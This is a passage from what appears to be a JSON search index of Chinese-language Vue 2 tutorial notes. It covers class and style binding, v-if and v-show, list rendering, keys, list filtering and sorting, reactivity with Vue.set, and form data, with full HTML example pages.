可以是字符串、数组、对象 \"]},{\"header\":\"1.1 字符串写法\",\"slug\":\"_1-1-字符串写法\",\"contents\":[\"字符串写法适用于：类名不确定，要动态获取\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定class样式-字符串写法</title> <style> .basic { width: 400px; height: 100px; border: 1px solid black; } .happy { border: 4px solid red; background-color: rgba(255, 255, 0, 0.644); background: linear-gradient(30deg, yellow, pink, orange, yellow); } .sad { border: 4px dashed rgb(2, 197, 2); background-color: gray; } .normal { background-color: skyblue; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器 --> <div id=\\\"root\\\"> <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 --> <div class=\\\"basic\\\" :class=\\\"mood\\\" @click=\\\"changeMood\\\">{{name}}</div> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', mood: 'normal', }, methods: { changeMood() { const arr = ['happy', 'sad', 'normal'] const index = Math.floor(Math.random() * 3) this.mood = arr[index] }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式01.gif\"]},{\"header\":\"1.2 数组写法\",\"slug\":\"_1-2-数组写法\",\"contents\":[\"数组写法适用于：要绑定多个样式，个数不确定，名字也不确定\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定class样式-数组写法</title> <style> .basic { width: 400px; height: 100px; border: 1px solid black; } .zhf1 { background-color: yellowgreen; } .zhf2 { font-size: 30px; text-shadow: 2px 2px 10px red; } .zhf3 { border-radius: 20px; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"> <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 --> <div class=\\\"basic\\\" :class=\\\"classArr\\\">{{name}}</div> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', classArr: ['zhf1', 'zhf2', 'zhf3'], }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式02.png\"]},{\"header\":\"1.3 对象写法\",\"slug\":\"_1-3-对象写法\",\"contents\":[\"对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定class样式-对象写法</title> <style> .basic { width: 400px; height: 100px; border: 1px solid black; } .zhf1 { background-color: yellowgreen; } .zhf2 { font-size: 30px; text-shadow: 2px 2px 10px red; } .zhf3 { border-radius: 20px; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"> <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 --> <div class=\\\"basic\\\" :class=\\\"classObj\\\">{{name}}</div> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', classObj: { zhf1: true, zhf2: false, zhf3: true, }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式03.png\"]},{\"header\":\"2. 绑定 style 样式\",\"slug\":\"_2-绑定-style-样式\",\"contents\":[\":style=\\\"xxx\\\" \",\"样式对象中的 key，必须是存在的 CSS 属性，如 fontSize、backgroundColor（小驼峰命名法）\"]},{\"header\":\"2.1 对象写法\",\"slug\":\"_2-1-对象写法\",\"contents\":[\":style=\\\"对象\\\"\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定style样式-对象写法</title> <style> .basic { width: 400px; height: 100px; border: 1px solid black; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"> <!-- 绑定style样式--对象写法 --> <div class=\\\"basic\\\" :style=\\\"styleObj, styleObj2\\\">{{name}}</div> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', styleObj: { fontSize: '40px', color: 'red', }, styleObj2: { backgroundColor: 'orange', }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式04.png\"]},{\"header\":\"2.2 数组写法\",\"slug\":\"_2-2-数组写法\",\"contents\":[\":style=\\\"数组\\\"\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定style样式-数组写法</title> <style> .basic { width: 400px; height: 100px; border: 1px solid black; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"> <!-- 绑定style样式--数组写法 --> <div class=\\\"basic\\\" :style=\\\"styleArr\\\">{{name}}</div> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', styleArr: [ { fontSize: '40px', color: 'blue', }, { backgroundColor: 'gray', }, ], }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式05.png\"]}]},\"/front-end/vue-notes/08-Vue%E6%A0%B8%E5%BF%83-%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93.html\":{\"title\":\"条件渲染\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/08-Vue核心-条件渲染\",\"v-if\",\"写法跟 if else 语法类似 \",\"v-if=\\\"表达式\\\"\",\"v-else-if=\\\"表达式\\\"\",\"v-else\",\"适用于：切换频率较低的场景，因为不展示的 DOM 元素直接被移除\",\"注意：v-if 可以和 v-else-ifv-else 一起使用，但要求结构不能被打断\",\"v-show\",\"写法：v-show=\\\"表达式\\\"\",\"适用于：切换频率较高的场景\",\"特点：不展示的 DOM 元素未被移除，仅仅是使用样式隐藏掉 display:none;\",\"备注：\",\"使用 v-if 的时，元素可能无法获取到，而使用 v-show 一定可以获取到\",\"template 标签不影响结构，页面 html 中不会有此标签，但只能配合 v-if，不能配合 v-show\",\"例：\",\"v-if\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>条件渲染v-if</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>当前的n值是：{{n}}</h2> <button @click=\\\"n++\\\">点我n+1</button> <!-- 使用v-if做条件渲染 --> <h2 v-if=\\\"false\\\">欢迎来到{{name}}</h2> <h2 v-if=\\\"1 === 1\\\">欢迎来到{{name}}</h2> <!-- v-else和v-else-if --> <div v-if=\\\"n === 1\\\">A</div> <div v-else-if=\\\"n === 2\\\">B</div> <div v-else-if=\\\"n === 3\\\">C</div> <div v-else>哈哈哈</div> <!-- v-if与template的配合使用 --> <template v-if=\\\"n === 1\\\"> <h3>你好</h3> <h3>QFNU</h3> <h3>曲阜</h3> </template> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'QFNU', n: 0, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-条件渲染01.gif\",\"v-show\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>条件渲染v-show</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>当前的n值是:{{ n }}</h2> <button @click=\\\"n++\\\">点我n+1</button> <!-- 使用v-show做条件渲染 --> <h2 v-show=\\\"false\\\">欢迎来到{{name}}</h2> <h2 v-show=\\\"n===1\\\">欢迎来到{{name}}</h2> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'QFNU', n: 0, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-条件渲染02.gif\"]}]},\"/front-end/vue-notes/09-Vue%E6%A0%B8%E5%BF%83-%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%9B%91%E8%A7%86.html\":{\"title\":\"列表渲染与数据监视\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/09-Vue核心-列表渲染与数据监视\"]},{\"header\":\"1. 列表渲染\",\"slug\":\"_1-列表渲染\",\"contents\":[]},{\"header\":\"1.1 基本列表\",\"slug\":\"_1-1-基本列表\",\"contents\":[\"v-for 指令\",\"用于展示列表数据\",\"语法：<li v-for=\\\"(item, index) of items\\\" :key=\\\"index\\\">，这里 key 可以是 index，更好的是遍历对象的唯一标识，这里的 of 也可以用 in\",\"可遍历：数组、对象、字符串（用的少）、指定次数（用的少）\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>基本列表</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <!-- 遍历数组 --> <h3>人员列表（遍历数组）</h3> <ul> <li v-for=\\\"(p,index) of persons\\\" :key=\\\"index\\\">{{p.name}}-{{p.age}}</li> </ul> <!-- 遍历对象 --> <h3>汽车信息（遍历对象）</h3> <ul> <li v-for=\\\"(value,k) of car\\\" :key=\\\"k\\\">{{k}}-{{value}}</li> </ul> <!-- 遍历字符串 --> <h3>演示遍历字符串（用得少）</h3> <ul> <li v-for=\\\"(char,index) of str\\\" :key=\\\"index\\\">{{char}}-{{index}}</li> </ul> <!-- 遍历指定次数 --> <h3>演示遍历指定次数（用得少）</h3> <ul> <li v-for=\\\"(number,index) of 5\\\" :key=\\\"index\\\"> {{ index }}-{{ number }} </li> </ul> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { persons: [ { id: '001', name: '张三', age: 18 }, { id: '002', name: '李四', age: 19 }, { id: '003', name: '王五', age: 20 }, ], car: { name: '奥迪', price: '70万', color: '黑色', }, str: 'hello', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视01.png\"]},{\"header\":\"1.2 key的作用与原理\",\"slug\":\"_1-2-key的作用与原理\",\"contents\":[\"原理：\",\"Vue核心-列表渲染与数据监视02.jpg\",\"Vue核心-列表渲染与数据监视03.jpg\",\"面试题：react、vue 中的 key 有什么作用？（key 的内部原理）\",\"虚拟 DOM 中 key 的作用：key 是虚拟 DOM 中对象的标识，当数据发生变化时，Vue 会根据新数据生成新的虚拟 DOM，随后 Vue 进行新虚拟 DOM 与旧虚拟 DOM 的差异比较，比较规则如下： \",\"旧虚拟 DOM 中找到了与新虚拟 DOM 相同的 key \",\"若虚拟 DOM 中内容没变, 直接使用之前的真实 DOM\",\"若虚拟 DOM 中内容变了, 则生成新的真实 DOM，随后替换掉页面中之前的真实 DOM\",\"旧虚拟 DOM 中未找到与新虚拟 DOM 相同的 key \",\"创建新的真实 DOM，随后渲染到到页面\",\"用 index 作为 key 可能会引发的问题 \",\"若对数据进行逆序添加、逆序删除等破坏顺序操作，会产生没有必要的真实 DOM 更新 ==> 界面效果没问题，但效率低\",\"若结构中还包含输入类的 DOM：会产生错误 DOM 更新 ==> 界面有问题\",\"开发中如何选择 key？ \",\"最好使用每条数据的唯一标识作为 key，比如 id、手机号、身份证号、学号等唯一值\",\"如果不存在对数据的逆序添加、逆序删除等破坏顺序的操作，仅用于渲染列表，使用 index 作为 key 是没有问题的\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>key的原理</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>人员列表（遍历数组）</h2> <button @click.once=\\\"add\\\">添加一个老刘</button> <ul> <li v-for=\\\"(p,index) of persons\\\" :key=\\\"index\\\"> {{p.name}}-{{p.age}} <input type=\\\"text\\\" /> </li> </ul> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false new Vue({ el: '#root', data: { persons: [ { id: '001', name: '张三', age: 18 }, { id: '002', name: '李四', age: 19 }, { id: '003', name: '王五', age: 20 }, ], }, methods: { add() { const p = { id: '004', name: '老刘', age: 40 } this.persons.unshift(p) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视04.gif\"]},{\"header\":\"1.3 列表过滤\",\"slug\":\"_1-3-列表过滤\",\"contents\":[\"可以使用 watch 也可以使用计算属性，使用计算属性更加简单方便一点\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>列表过滤</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>人员列表</h2> <input type=\\\"text\\\" placeholder=\\\"请输入名字\\\" v-model=\\\"keyWord\\\" /> <ul> <li v-for=\\\"(p,index) of filPersons\\\" :key=\\\"p.id\\\"> {{p.name}}-{{p.age}}-{{p.sex}} </li> </ul> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { keyWord: '', persons: [ { id: '001', name: '马冬梅', age: 19, sex: '女' }, { id: '002', name: '周冬雨', age: 20, sex: '女' }, { id: '003', name: '周杰伦', age: 21, sex: '男' }, { id: '004', name: '温兆伦', age: 22, sex: '男' }, ], //用watch实现 //filPersons: [], }, //用watch实现 /*watch: { keyWord: { immediate: true, handler(val) { this.filPersons = this.persons.filter((p) => { return p.name.indexOf(val) !== -1 }) }, }, },*/ //用computed实现 computed: { filPersons() { return this.persons.filter((p) => { return p.name.indexOf(this.keyWord) !== -1 }) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视05.gif\"]},{\"header\":\"1.4 列表排序\",\"slug\":\"_1-4-列表排序\",\"contents\":[\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>列表排序</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>人员列表</h2> <input type=\\\"text\\\" placeholder=\\\"请输入名字\\\" v-model=\\\"keyWord\\\" /> <button @click=\\\"sortType = 2\\\">年龄升序</button> <button @click=\\\"sortType = 1\\\">年龄降序</button> <button @click=\\\"sortType = 0\\\">原顺序</button> <ul> <li v-for=\\\"(p,index) of filPersons\\\" :key=\\\"p.id\\\"> {{p.name}}-{{p.age}}-{{p.sex}} </li> </ul> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { keyWord: '', sortType: 0, //0原顺序，1降序，2升序 persons: [ { id: '001', name: '马冬梅', age: 30, sex: '女' }, { id: '002', name: '周冬雨', age: 31, sex: '女' }, { id: '003', name: '周杰伦', age: 18, sex: '男' }, { id: '004', name: '温兆伦', age: 19, sex: '男' }, ], }, computed: { filPersons() { const arr = this.persons.filter((p) => { return p.name.indexOf(this.keyWord) !== -1 }) //判断是否需要排序 if (this.sortType) { arr.sort((p1, p2) => { return this.sortType === 1 ? p2.age - p1.age : p1.age - p2.age }) } return arr }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视06.gif\"]},{\"header\":\"2. Vue数据监视\",\"slug\":\"_2-vue数据监视\",\"contents\":[\"更新时的一个问题：this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} 更改 data 数据，Vue 不监听，模板不改变\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>更新时的一个问题</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>人员列表</h2> <button @click=\\\"updateMei\\\">更新马冬梅的信息</button> <ul> <li v-for=\\\"(p,index) of persons\\\" :key=\\\"p.id\\\"> {{p.name}}-{{p.age}}-{{p.sex}} </li> </ul> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { persons: [ { id: '001', name: '马冬梅', age: 30, sex: '女' }, { id: '002', name: '周冬雨', age: 31, sex: '女' }, { id: '003', name: '周杰伦', age: 18, sex: '男' }, { id: '004', name: '温兆伦', age: 19, sex: '男' }, ], }, methods: { updateMei() { // this.persons[0].name = '马老师' //奏效 // this.persons[0].age = 50 //奏效 // this.persons[0].sex = '男' //奏效 // this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效 this.persons.splice(0, 1, { id: '001', name: '马老师', age: 50, sex: '男', }) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视07.gif\",\"我们先来研究一下 Vue 是如何监测对象里面属性的改变的\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Vue监测数据改变的原理-对象</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器 --> <div id=\\\"root\\\"> <h2>学校名称：{{name }}</h2> <h2>学校地址：{{address}}</h2> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', }, }) </script> </body> </html> \",\"我们打开控制台，由于数据代理，data 中的数据最终会出现在 vm 身上\",\"Vue核心-列表渲染与数据监视08.png\",\"我们复习一下数据代理：\",\"Vue核心-MVVM模型与数据代理06.png\",\"Vue 将 data 中的数据拷贝了一份到 _data 属性中，其实在这一步之前还有一步，那就是对 data 中的数据进行加工\",\"若没有加工的过程，那么 _data 和 data 中的内容应该就是一模一样的, 而 _data 中内容如下图：\",\"Vue核心-列表渲染与数据监视09.png\",\"所谓加工简单来说就是把 data 中的每一组 key-value 都生成一个 getter 和 setter，那么为什么要加工 data 呢，因为这样可以做响应式：例如当我们修改了 data 中的 name 属性，name 的 setter 就会被调用，在 setter 中调用了一个方法，会重新解析模板，生成新的虚拟 DOM，然后 diff 算法对比，然后更新页面，从而实现对数据的监视\",\"我们来模拟一个数据监视（Vue 中实现的更加完善）\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>模拟数据监视</title> </head> <body> <script> let data = { name: '曲阜师范大学', address: '曲阜', } //创建一个监视的实例对象，用于监视data中属性的变化 const obs = new Observer(data) console.log(obs) // 准备一个vm实例对象 let vm = {} vm._data = data = obs function Observer(obj) { // 汇总对象中所有的属性形成一个数组 const keys = Object.keys(obj) console.log(keys) // 遍历 keys.forEach((k) => { Object.defineProperty(this, k, { get() { return obj[k] }, set(val) { console.log( `${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了` ) obj[k] = val }, }) }) } </script> </body> </html> \",\"Observer 构造函数会将 data 中的每个属性都添加到 Observer 实例对象中（通过 defineProperty()），并生成相应的 getter 和 setter，实现对 data 中属性的代理（data 是创建实例时传入的参数）\",\"效果：\",\"Vue核心-列表渲染与数据监视10.png\",\"存在两个问题：\",\"在 Vue 中还对 _data（data） 中的属性进行了代理，可以直接通过 vm.xxx 操作数据，而这里需要通过 vm._data.xxx 来操作数据\",\"只能监测一层数据，如果 data 中有对象，对象中还有属性，就监测不到\",\"下面我们认识一个 API：Vue.set()\",\"首先我们应该知道：读取一个对象中不存在的属性，是 undefined，不报错，如果一个属性值是 undefined，Vue 不会把他展示到页面上\",\"假设需要给某个对象添加一个新的属性（该属性一开始没有定下来，没有在源代码中写，后来随着用户的交互发现需要添加这么一个性别属性），如果直接在 vm._data.某对象 或者 vm 中添加该属性，是做不到响应式的，没有 getter 和 setter 方法，而通过 Vue.set() 或者 vm.$set() 方法，可以做到“后添加的数据也可以实现响应式“\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Vue.set的使用</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器 --> <div id=\\\"root\\\"> <h2>学校名称：{{name}}</h2> <h2>学校地址：{{address}}</h2> <hr /> <h1>学生信息</h1> <button @click=\\\"addSex\\\">添加一个性别，默认值男</button> <h2>学生姓名：{{student.name}}</h2> <h2 v-if=\\\"student.sex\\\">学生性别：{{student.sex}}</h2> <h2>学生年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2> <h2>朋友们</h2> <ul> <li v-for=\\\"(f,index) in student.friends\\\" :key=\\\"index\\\"> {{f.name}}--{{f.age}} </li> </ul> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', student: { name: 'tom', age: { rAge: 21, sAge: 18, }, friends: [ { name: 'jerry', age: 23 }, { name: 'tony', age: 24 }, ], }, }, methods: { addSex() { //Vue.set(this.student, 'sex', '男') this.$set(this.student, 'sex', '男') }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-列表渲染与数据监视11.gif\",\"接下来我们研究一下 Vue 是如何监测数组里面属性的改变的\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Vue监测数据改变的原理-数组</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>学校名称：{{name}}</h2> <h2>学校地址：{{address}}</h2> <hr /> <h1>学生信息</h1> <button @click=\\\"addSex\\\">添加一个性别，默认值男</button> <h2>学生姓名：{{student.name}}</h2> <h2 v-if=\\\"student.sex\\\">学生性别：{{student.sex}}</h2> <h2>学生年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2> <h2>朋友们</h2> <ul> <li v-for=\\\"(f,index) in student.friends\\\" :key=\\\"index\\\"> {{f.name}}--{{f.age}} </li> </ul> <h2>爱好</h2> <ul> <li v-for=\\\"(h,index) in student.hobby\\\" :key=\\\"index\\\">{{h}}</li> </ul> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', student: { name: 'tom', age: { rAge: 21, sAge: 18, }, hobby: ['唱', '跳', 'rap'], friends: [ { name: 'jerry', age: 23 }, { name: 'tony', age: 24 }, ], }, }, methods: { addSex() { //Vue.set(this.student, 'sex', '男') this.$set(this.student, 'sex', '男') }, }, }) </script> </body> </html> \",\"我们在控制台中会发现：\",\"Vue 核心-列表渲染与数据监视12.png\",\"数组中的数据并没有 getter 和 setter 方法，这也就解释了上面的更新数组的问题\",\"总结\",\"vue 会监视 data 中所有层次的数据\",\"如何监测对象中的数据？通过 setter 实现监视，且要在 new Vue() 时就传入要监测的数据 \",\"对象创建后追加的属性，Vue 默认不做响应式处理\",\"如需给后添加的属性做响应式，请使用如下 API Vue.set(target,propertyName/index,value) 或 vm.$set(target,propertyName/index,value)\",\"如何监测数组中的数据？ 通过包裹数组更新元素的方法实现，本质就是做了两件事 \",\"调用原生对应的方法对数组进行更新\",\"重新解析模板，进而更新页面\",\"在 Vue 修改数组中的某个元素一定要用如下方法 \",\"push() 、pop() 、unshift()、shift()、splice()、sort()、reverse() ，这几个方法被 Vue 重写了\",\"Vue.set() 或 vm.$set()，特别注意：Vue.set() 和 vm.$set() 不能给 vm 或 vm 的根数据对象（data 等）添加属性\",\"综合案例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>总结数据监视</title> <style> button { margin-top: 10px; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h1>学生信息</h1> <button @click=\\\"student.age++\\\">年龄+1岁</button> <br /> <button @click=\\\"addSex\\\">添加性别属性，默认值：男</button> <br /> <button @click=\\\"student.sex = '未知' \\\">修改性别</button> <br /> <button @click=\\\"addFriend\\\">在列表首位添加一个朋友</button> <br /> <button @click=\\\"updateFirstFriendName\\\"> 修改第一个朋友的名字为：张三 </button> <br /> <button @click=\\\"addHobby\\\">添加一个爱好</button> <br /> <button @click=\\\"updateHobby\\\">修改第一个爱好为：开车</button> <br /> <button @click=\\\"removeSmoke\\\">过滤掉爱好中的rap</button> <br /> <h3>姓名：{{ student.name }}</h3> <h3>年龄：{{ student.age }}</h3> <h3 v-if=\\\"student.sex\\\">性别：{{student.sex}}</h3> <h3>爱好：</h3> <ul> <li v-for=\\\"(h,index) in student.hobby\\\" :key=\\\"index\\\">{{ h }}</li> </ul> <h3>朋友们：</h3> <ul> <li v-for=\\\"(f,index) in student.friends\\\" :key=\\\"index\\\"> {{ f.name }}--{{ f.age }} </li> </ul> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { student: { name: 'tom', age: 18, hobby: ['唱', '跳', 'rap'], friends: [ { name: 'jerry', age: 35 }, { name: 'tony', age: 36 }, ], }, }, methods: { addSex() { // Vue.set(this.student,'sex','男') this.$set(this.student, 'sex', '男') }, addFriend() { this.student.friends.unshift({ name: 'jack', age: 70 }) }, updateFirstFriendName() { this.student.friends[0].name = '张三' }, addHobby() { this.student.hobby.push('学习') }, updateHobby() { // this.student.hobby.splice(0,1,'开车') // Vue.set(this.student.hobby,0,'开车') this.$set(this.student.hobby, 0, '开车') }, removeSmoke() { this.student.hobby = this.student.hobby.filter((h) => { return h !== 'rap' }) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue 核心-列表渲染与数据监视13.gif\"]}]},\"/front-end/vue-notes/10-Vue%E6%A0%B8%E5%BF%83-%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE.html\":{\"title\":\"收集表单数据\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/10-Vue核心-收集表单数据\",\"收集表单数据\",\"若 <input type=\\\"text\\\"/>，则 v-model 收集的是 value 值，用户输入的内容就是 value 值\",\"若 <input type=\\\"radio\\\"/>，则 v-model 收集的是 value 值，且要给标签配置 value 属性\",\"若 <input type=\\\"checkbox\\\"/>\",\"没有配置 value 属性，那么收集的是 checked 属性（勾选 or 未勾选，是布尔值）\",\"配置了 value 属性 \",\"v-model 的初始值是非数组，那么收集的就是 checked（勾选 or 未勾选，是布尔值）\",\"v-model 的初始值是数组，那么收集的就是 value 组成的数组\",\"v-model 的三个修饰符：\",\"lazy 失去焦点后再收集数据\",\"number 输入字符串转为有效的数字\",\"trim 输入首尾空格过滤\",\"form 表单中 @submit.prevent 作用方法\",\"<form @submit.prevent=\\\"Demo\\\"></form> \",\"submit：表示通常与 form 